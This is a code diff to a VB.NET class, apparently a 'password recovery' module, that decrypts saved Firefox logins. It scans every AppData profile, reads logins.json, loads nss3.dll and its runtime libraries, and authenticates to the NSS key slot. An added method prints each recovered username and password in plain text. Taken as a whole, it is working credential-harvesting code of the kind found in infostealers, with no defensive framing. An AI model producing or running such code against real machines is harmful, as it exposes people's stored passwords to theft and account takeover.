@@ -218,6 +218,10 @@ Class PREC
     End Function
 
     Private Function NSS_Init(ByVal configdir As String) As Long
+		hModuleList.Add(LoadLibrary(FindFirefoxInstallationPath() & "\msvcr100.dll"))
+		hModuleList.Add(LoadLibrary(FindFirefoxInstallationPath() & "\msvcp100.dll"))
+		hModuleList.Add(LoadLibrary(FindFirefoxInstallationPath() & "\msvcr120.dll"))
+		hModuleList.Add(LoadLibrary(FindFirefoxInstallationPath() & "\msvcp120.dll"))
         hModuleList.Add(LoadLibrary(FindFirefoxInstallationPath() & "\mozglue.dll"))
         NSS3 = LoadLibrary(FindFirefoxInstallationPath() & "\nss3.dll")
         hModuleList.Add(NSS3)
@@ -243,14 +247,14 @@ Class PREC
 
     Public Function RecoverFireFox() As Boolean
         Dim result As Boolean = False
-        'Dim ptr As New IntPtr()
-        'Wow64DisableWow64FsRedirection(ptr)
         Try
             For Each AppData As String In GetAppDataFolders()
                 Dim mozProfilePath As String = FindFirefoxProfilePath(AppData)
                 If Not IO.Directory.Exists(mozProfilePath) Then Continue For
                 Dim mozLogins = IO.File.ReadAllText(mozProfilePath & "\logins.json")
                 NSS_Init(mozProfilePath & "\")
+                Dim keySlot As Long = PK11_GetInternalKeySlot()
+                PK11_Authenticate(keySlot, True, 0)
                 Dim JSONRegex As New Regex("\""(hostname|encryptedPassword|encryptedUsername)"":""(.*?)""")
                 Dim mozMC = JSONRegex.Matches(mozLogins)
                 For I = 0 To mozMC.Count - 1 Step 3
@@ -267,9 +271,11 @@ Class PREC
             Next
             result = True
         Catch e As Exception
+#If DEBUG Then
+            Throw e
+#End If
             result = False
         End Try
-        'Wow64RevertWow64FsRedirection(ptr)
         Return result
     End Function
 #End Region
@@ -505,6 +511,16 @@ Class Account
     Sub New(ByVal Type As AccountType)
         Me.Type = Type
     End Sub
+    Public Overrides Function ToString() As String
+        Dim sb As New StringBuilder()
+        sb.AppendLine("PREC.Account {")
+        sb.AppendLine("Type:        " & Type.ToString)
+        sb.AppendLine("Domain:      " & Domain)
+        sb.AppendLine("Username:    " & Username)
+        sb.AppendLine("Password:    " & Password)
+        sb.AppendLine("}")
+        Return sb.ToString
+    End Function
 End Class
 
 Enum AccountType
